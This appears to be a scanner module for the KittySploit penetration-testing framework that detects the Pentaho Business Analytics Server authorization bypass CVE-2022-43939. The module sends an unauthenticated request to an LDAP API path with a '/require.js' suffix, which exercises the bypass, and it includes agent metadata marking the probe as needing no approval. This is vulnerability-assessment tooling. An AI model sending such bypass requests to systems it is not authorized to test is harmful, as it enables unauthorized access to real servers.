#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hitachi Vantara Pentaho Business Analytics Server versions before 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hitachi Pentaho Business Analytics Server - Bypass Authorization Detection',
        'description': 'Hitachi Vantara Pentaho Business Analytics Server versions before 9.4.0.1 and 9.3.0.2, including 8.3.x contain security restrictions using non-canonical URLs which can be circumvented.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'pentaho', 'hitachi', 'auth-bypass', 'vkev', 'kev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://support.pentaho.com/hc/en-us/articles/14455394120333--Resolved-Pentaho-BA-Server-Use-of-Non-Canonical-URL-Paths-for-Authorization-Decisions-Versions-before-9-4-0-1-and-9-3-0-2-including-8-3-x-Impacted-CVE-2022-43939-',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-43769',
            'https://research.aurainfosec.io/pentest/pentah0wnage/',
        ],
        'cve': 'CVE-2022-43939',
    }

    def run(self):
        path = '/pentaho/Login'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Pentaho User Console - Login',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('{}',)
        header_any = ('Path=/pentaho', 'application/json',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Hitachi Pentaho Business Analytics Server - Bypass Authorization detected', path=path)
            return True
        return False

